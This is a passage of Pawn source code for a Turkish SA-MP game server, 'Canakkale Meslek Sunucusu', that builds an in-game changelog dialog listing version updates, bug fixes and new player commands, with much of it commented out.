	format(YenilikYazi, 20004, "%s{DDDDDD} Aracýn motorunu açma kapatma eklendi. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} ATM Sistemi eklendi. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} Karavan sistemi eklendi. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} Þirket sistemi Mysql Veri tabanýna entegre edildi. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} Ýþyeri sistemi Mysql Veri tabanýna entegre edildi. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} /banka komutu kaldýrýldý. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} LV-LS-SF Þehirlerine düzenlemeler eklemeler yapýldý. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} LV-LS-SF Otogar haritalarý yenilendi. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} Longway haritasý komple yenilendi. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} Longway Otogar eklendi. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} Emkatu haritasý komple yenilendi. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} Yeni yük yerleri eklendi. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} Sunucunun arayüzü deðiþtirildi. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} Rehber yetkisi kaldýrýldý. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} Helper (max 5 lvl) yetkisi eklendi. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} Ahýr yetkisi isime özel hale getirildi. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} Ekranda yer alan duyuru penceresi kaldýrýldý. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} Kendi aracýný herkesin kullanýmýna açma eklendi. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} Araç plaka düzenleme sistemi eklendi. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} Sunucu  yazýlarýnýn renkleri görünümleri güncellendi. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} /sorusor komutu 'Sohbet Oturumu' haline getirildi. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} Araç hasarlýysa stop edecek þekilde sistem ayarlandý. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} /goetk komutu eklendi. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} Giriþ-Çýkýþ yazýlarý deðiþtirildi. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} DJ'lere özel giriþ yazýsý eklendi. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} Þirket duyurusu sistemi eklendi. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} MP3-Radyo açma kýsýmlarý telefona geçirildi. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} MP3-Radyo açma ekranlarýna arama butonu yerleþtirildi. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} Giþe sahip yazýlarý ve giþe ücret yazýlarý güncellendi. \n", YenilikYazi);
    format(YenilikYazi, 20004, "%s{DDDDDD} Higway haritasý komple yenilendi. \n", YenilikYazi);
    format(YenilikYazi, 20004, "%s{DDDDDD} Yeni speedometer eklendi ( hýz göstergesi ). \n", YenilikYazi);
    format(YenilikYazi, 20004, "%s{DDDDDD} Level sistemi getirildi. \n", YenilikYazi);
    format(YenilikYazi, 20004, "%s{DDDDDD} Baþarým sistemi eklendi. \n", YenilikYazi);
    format(YenilikYazi, 20004, "%s{DDDDDD} Çevik kuvvetin hapise atmasý kaldýrýldý. \n", YenilikYazi);
    format(YenilikYazi, 20004, "%s{DDDDDD} Selfie sistemi getirildi '/selfie'. \n", YenilikYazi);
    format(YenilikYazi, 20004, "%s{DDDDDD} Ev sistemi yenilendi /evyardim. \n", YenilikYazi);
    format(YenilikYazi, 20004, "%s{DDDDDD} Ev anahtarý verme eklendi. \n", YenilikYazi);
    format(YenilikYazi, 20004, "%s{DDDDDD} Ev kasasý eklendi. \n", YenilikYazi);
    format(YenilikYazi, 20004, "%s{DDDDDD} V4'den kalan ev ve arabalarýn paralarýný çekebilmeniz için /v5teslim eklendi. \n", YenilikYazi);
    format(YenilikYazi, 20004, "%s{DDDDDD} Oyuncularýn kendi sohbet ekranlarýný temizleyebilmeleri için /pcc komutu getirildi. \n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} MP3 ve RADYO sistemine isim ile aratma getirildi. \n", YenilikYazi);
	ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_TABLIST, "{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V5.0.0 YENILIKLER{DDDDDD})", YenilikYazi, "Kapat", "");
return 1;
}*/
CMD:yenilikler(playerid, params[])
{
 	new YenilikYazi[2000];

 	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V5.1.1 Update sürüm (7){DDDDDD})\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}  Güncelleme Tarih: 06.05.2018 / 20:10\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/arenk1 /arenk2 komutlarý geri getirildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/gohome düzeltildi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Sahipli iþyerini satýn alma bugý düzeltildi\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}/yenilikler güncellendi :) \n", YenilikYazi);

 	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V5.1.1 Update sürüm (6){DDDDDD})\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}  Güncelleme Tarih: 06.05.2018 / 00:30\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Araç modifiye gitme sorunu giderildi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Oto-renk kapanmama sorunu giderildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Ýþyeri alýnamama sorunu giderildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/m1-6 üzerine fix çalýþmasý yapýldý.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Labeller ile ilgili bug fix çalýþmasý yapýldý.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}/yenilikler güncellendi :) \n", YenilikYazi);
    
 	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V5.1.1 Update sürüm (5){DDDDDD})\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}  Güncelleme Tarih: 02.05.2018 / 03:40\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}VIP'lere Otomatik Arac Renk Sitemi Eklendi (/otorenkon & /otorenkoff)\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}VIP'lere Özel Araclar Eklendi. (/m1,/m8).\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Güle Güle Yazma Komutu Eklendi (/bb).\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Mezara Gitmek Ýçin (/mezar).\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}2 Mayýsta Herkes VIP Þekilde Ayarlandý.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}/yenilikler güncellendi :) \n", YenilikYazi);
 	

 /*
  	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V5.1.1 Update sürüm (4){DDDDDD})\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}  Güncelleme Tarih: 30.05.2018 / 02:15\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Banka Þifre Deðiþtirme Eklendi /bankasifredegis\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Hoþgeldin Hoþbulduk /hg /hb Eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}1 Mayýs Yazýlarý Eklendi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}1 Mayýsta Herkes VIP Þekilde Ayarlandý.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}/yenilikler güncellendi :) \n", YenilikYazi);
    
 	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V5.1.1 Update sürüm (3){DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Gc , Mute Komutlar Fixlendi..\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Pizzacý Meslek Fixlendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Ev Baþarým Fixlendi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Eve Iþýnlanma /gohome Fixlendi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Hastane Pickuplarý Fixlendi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Sifre Unuttum Eklendi WebSite sifre.Canakkale Meslek.com\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Alt Duyuru Text /textkapat Fixlendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/yenilikler güncellendi :) \n", YenilikYazi);
	
    format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V5.1.1 U sürüm (1){DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Anti-Troll Korumasý Eklendi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Max Ping 1500 Çýkarýldý.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Anti-Nick Deðiþtirme Eklendi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Anti-Incoming Koruma Eklendi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Yemek Fiyatlarý Düzenlendi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Panel Eklendi Canakkale Meslek.com/forum/kpanel.php\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}/bugreport Eklendi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Mysql Version Güncellendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/yenilikler güncellendi :) \n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{FFFFFF}SUNUCU BETA AÞAMASINDADIR \nGELÝÞTÝRÝLMEYE MESLEK BUGLARI FÝXLENCEKTÝR.\n\n", YenilikYazi);

    format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V5.1.0 B1{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Araç kalan benzinin sisteme kayýt olmasý ayarlandý..\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Harita üstüne duyuru TextDraw eklendi.ý\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Hastane önlerine 112 Acil ikonlarý eklendi..\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}112 Ýkonlarýndan can alýnabilmesi için /candoldur komutu eklendi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Açlýk ve  susuzluk sistemi eklendi. YAKINDA\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}/Yemek - /yemekler komutu eklendi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}/icecek - /icecekler komutu eklendi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}/asay2 Komutu eklendi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}/Mail kayýt sistemi eklendi..\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/yenilikler güncellendi :) \n", YenilikYazi);

 	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V5.0.4{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Client Getirildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Sunucu Yazýlarý Düzeltildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Anti-Crash Geliþtirildi 0.3.7 R2\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}EnFazla Ýþyeri Satýn Alma 3 Çýkarýldý.\n", YenilikYazi);
 	

	format(YenilikYazi, 2000, "%s\n", YenilikYazi);
	
    format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V5.0.3 Fix 1{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Giriþ yazýlarýnda düzenleme yapýldý.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Chat taglarýnda düzenlemeler yapýldý\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}iþyeri alma bugu giderildi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Yeni ev ve iþyerleri açýldý.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}/araba komutunda araba kilometresinin 0 Gözükme sorunu giderildi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Yýlbaþýnda (30-31 Aralýk ve 1 Ocak) Herkes VIP olacak þekilde ayarlandý.\n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}/yenilikler güncellendi :) \n", YenilikYazi);

 	format(YenilikYazi, 2000, "%s\n", YenilikYazi);

 	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V5.0.3{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Yýlbaþý textdrawlarý geri getirildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Baþarýmlarý görebilmeniz için /basarimlar komutu getirildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Araçlarýn yakýt kapasiteleri bir miktar artýrýldý.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Motor kapalýyken araçlar yakýt yakmayacak.\n", YenilikYazi);
 	format(YenilikYazi, 2000, "%s{DDDDDD}Oyuncu oyuna girdiðinde DJ'in açtýðý müzik çalýyor olmayacak.\n", YenilikYazi);
  	format(YenilikYazi, 2000, "%s{DDDDDD}/sac yazýp DJ'in açtýðý müzikleri dinleyebilecekler.\n", YenilikYazi);
  	format(YenilikYazi, 2000, "%s{DDDDDD}Num 2'ye basýp motor açýp kapatma manuel vitesle çakýþtýðý için kaldýrýldý.\n", YenilikYazi);
  	format(YenilikYazi, 2000, "%s{DDDDDD}Evlerin gitmesi bugu ile ilgili çalýþma yapýldý.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Ýþyeri gelir bugu ile ilgili çalýþma yapýldý.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Görevdeyken ehliyet yerine ýþýnlanma engellendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/yenilikler güncellendi :) \n", YenilikYazi);

 	format(YenilikYazi, 2000, "%s\n", YenilikYazi);
 	
 	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V5.0.2{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Giþe oluþturma bugu incelendi düzeltilmeye çalýþýldý.\n", YenilikYazi);
 	format(YenilikYazi, 2000, "%s{DDDDDD}Ýþyeri ve ev bugu çözülemedi bir güncelleme ertelendi.\n", YenilikYazi);
  	format(YenilikYazi, 2000, "%s{DDDDDD}Hostname düzeltildi.\n", YenilikYazi);
 // 	format(YenilikYazi, 2000, "%s{DDDDDD}/sarkiac komutu getirildi.\n", YenilikYazi);
  	format(YenilikYazi, 2000, "%s{DDDDDD}/isteksarki komutundan artýk sunucuda olmayan þarkýlar istenemeyecek.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Pilot görev bugu giderildi / geliþtirildi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Adminler chat temizleyince üstte yazýlarýn kalmasý giderildi\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Chat engellenince telsiz ve geliþmiþ chat kullanýmý da engellendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/yenilikler güncellendi :) \n", YenilikYazi);*/
 	
/*
 	format(YenilikYazi, 2000, "%s\n", YenilikYazi);

 	format(YenilikYazi, 2000, "%s{DDDDDD}({FF4040}Canakkale Meslek Sunucusu V5.0.1{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Þirket araçlarý spawn olma sorunu giderildi\n", YenilikYazi);
 	format(YenilikYazi, 2000, "%s{DDDDDD}Kargocu araçlarýnýn hemen spawn olmasý sorunu çözüldü.\n", YenilikYazi);
  	format(YenilikYazi, 2000, "%s{DDDDDD}Kurban bayramý TextDraw(arayüz) aktif edildi.\n", YenilikYazi);
  	format(YenilikYazi, 2000, "%s{DDDDDD}/yenilikler güncellendi :) \n", YenilikYazi);

 	format(YenilikYazi, 2000, "%s\n", YenilikYazi);


	format(YenilikYazi, 2000, "%s{DDDDDD}({FF4040}Canakkale Meslek Sunucusu V5{DDDDDD})\n", YenilikYazi);
 	format(YenilikYazi, 2000, "%s{DDDDDD}/v5yenilikler\n", YenilikYazi);
 	
	//format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V5.0.0{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} Yeni giriþ ekraný tasarlandý-kodlandý. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} Kargocu mesleði getirildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} Dolmuþ þöförü mesleði getirildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} Galeri sistemi eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} Telefon sistemi eklendi (Y Tuþu). \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} Aracýn motorunu açma kapatma eklendi. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} ATM Sistemi eklendi. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} Karavan sistemi eklendi. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} Þirket sistemi Mysql Veri tabanýna entegre edildi. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} Ýþyeri sistemi Mysql Veri tabanýna entegre edildi. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} /banka komutu kaldýrýldý. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} LV-LS-SF Þehirlerine düzenlemeler eklemeler yapýldý. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} LV-LS-SF Otogar haritalarý yenilendi. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} Longway haritasý komple yenilendi. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} Longway Otogar eklendi. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} Emkatu haritasý komple yenilendi. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} Yeni yük yerleri eklendi. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} Sunucunun arayüzü deðiþtirildi. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} Rehber yetkisi kaldýrýldý. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} Helper (max 5 lvl) yetkisi eklendi. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} Ahýr yetkisi isime özel hale getirildi. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} Ekranda yer alan duyuru penceresi kaldýrýldý. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} Kendi aracýný herkesin kullanýmýna açma eklendi. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} Araç plaka düzenleme sistemi eklendi. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} Sunucu  yazýlarýnýn renkleri görünümleri güncellendi. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} /sorusor komutu 'Sohbet Oturumu' haline getirildi. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} Araç hasarlýysa stop edecek þekilde sistem ayarlandý. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} /goetk komutu eklendi. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} Giriþ-Çýkýþ yazýlarý deðiþtirildi. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} DJ'lere özel giriþ yazýsý eklendi. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} Þirket duyurusu sistemi eklendi. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} MP3-Radyo açma kýsýmlarý telefona geçirildi. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} MP3-Radyo açma ekranlarýna arama butonu yerleþtirildi. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} Giþe sahip yazýlarý ve giþe ücret yazýlarý güncellendi. \n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD} Higway haritasý komple yenilendi. \n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD} Yeni speedometer eklendi ( hýz göstergesi ). \n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD} Level sistemi getirildi. \n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD} Baþarým sistemi eklendi. \n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD} Çevik kuvvetin hapise atmasý kaldýrýldý. \n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD} Selfie sistemi getirildi '/selfie'. \n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD} Ev sistemi yenilendi /evyardim. \n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD} Ev anahtarý verme eklendi. \n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD} Ev kasasý eklendi. \n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD} V4'den kalan ev ve arabalarýn paralarýný çekebilmeniz için /v5teslim eklendi. \n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD} Oyuncularýn kendi sohbet ekranlarýný temizleyebilmeleri için /pcc komutu getirildi. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD} MP3 ve RADYO sistemine isim ile aratma getirildi. \n", YenilikYazi);
*/

	/*
	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V4.9.8{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}TS3 Ip adresi güncellendi\n", YenilikYazi);
 	format(YenilikYazi, 2000, "%s{DDDDDD}/market komutu güncellendi.\n", YenilikYazi);
  	format(YenilikYazi, 2000, "%s{DDDDDD}Rehberlere /musait komutu getirildi\n", YenilikYazi);
  	format(YenilikYazi, 2000, "%s{DDDDDD}/yenilikler güncellendi :) \n", YenilikYazi);

 	    format(YenilikYazi, 2000, "%s\n", YenilikYazi);


   		format(YenilikYazi, 2000, "%s{DDDDDD}({FF4040}Canakkale Meslek Sunucusu V4.9.5{DDDDDD})\n", YenilikYazi);
 	    format(YenilikYazi, 2000, "%s{DDDDDD}Panelden aldýðýnýz ürünleri teslim almanýz için /teslimal komutu getirildi.\n", YenilikYazi);
 	    format(YenilikYazi, 2000, "%s{DDDDDD}Bug Fix Yapýldý.\n", YenilikYazi);

 	    format(YenilikYazi, 2000, "%s\n", YenilikYazi);

 		format(YenilikYazi, 2000, "%s{DDDDDD}({FF4040}Canakkale Meslek Sunucusu V4.9.1{DDDDDD})\n", YenilikYazi);
 	    format(YenilikYazi, 2000, "%s{DDDDDD}Bug Fix Yapýldý.\n", YenilikYazi);

 	    format(YenilikYazi, 2000, "%s\n", YenilikYazi);

 	format(YenilikYazi, 2000, "%s{DDDDDD}({FF4040}Canakkale Meslek Sunucusu V4.9{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Þirket üye listesinde 30 dan fazlasýnýn görünmemesi bugu giderildi þirket kiþi limiti artýk sýnýrsýz !\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Ramazan'a özel iftar saatleri sistemi yapýldý iftar ve sahur saatlerinde devreye girecektir.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Sunucu yeni karakter panelimiz olan 'Canakkale Meslek.com/TircilarMekani/panel' sayfasýna uygun hale getirildi.\n", YenilikYazi);

 	format(YenilikYazi, 2000, "%s{DDDDDD}({FF4040}Canakkale Meslek Sunucusu V4.8.1{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}19 Mayýs'a Özel Herkes VIP olarak Ayarlandý\n", YenilikYazi);

 	format(YenilikYazi, 2000, "%s{DDDDDD}({FF4040}Canakkale Meslek Sunucusu V4.8{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Reiss_Umut 24 Saat Sistemi Eklendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}5.000 Skor ve üstü kiþiler için /stamir komutu getirildi /tamir den farklý olarak tamire 500 TL ödeyecekler\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}5000 Skor ve üstü kiþilere özel GELÝÞMÝÞ CHAT eklendi /gc (mesaj)\n", YenilikYazi);


	format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);

 	format(YenilikYazi, 2000, "%s{DDDDDD}({FF4040}Canakkale Meslek Sunucusu V4.7.2{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Sorusor sistemindeki bug giderildi ve tekrardan aktif edildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}3 Adet Þirket Mapý Eklendi.\n", YenilikYazi);

 	format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);

 	format(YenilikYazi, 2000, "%s{DDDDDD}({FF4040}Canakkale Meslek Sunucusu V4.7.1{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Sorusor sisteminde bug olduðundan dolayý geçici bir süre devredýþý býrakýlmýþtýr.\n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({FF4040}Canakkale Meslek Sunucusu V4.7{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}23 Nisan'a özel arayüz eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}23 Nisan'da herkes VIP olacak.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/market komutu güncellendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Artýk Canakkale Meslek.com/market üzerinden VIP, Para, Skor... satýn alabileceksiniz.\n", YenilikYazi);*/
/*
	format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({FF4040}Canakkale Meslek Sunucusu V4.6{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Oyunda olmadan para skor vb. þeyler vermek için konsola /ban , /unban , /setvip , /getid , /paraver , /skorver gibi komutlar getirildi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Oyuna rehber girme bugu düzeltildi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Joket Holding yeni þirket map'ý eklendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}MortalAngel_'in Texture'li Özel map'ý eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/sorusor komutuna soru 2 dakika içinde cevaplanmazsa sorunun iptal olmasý ayarlandý\n", YenilikYazi);
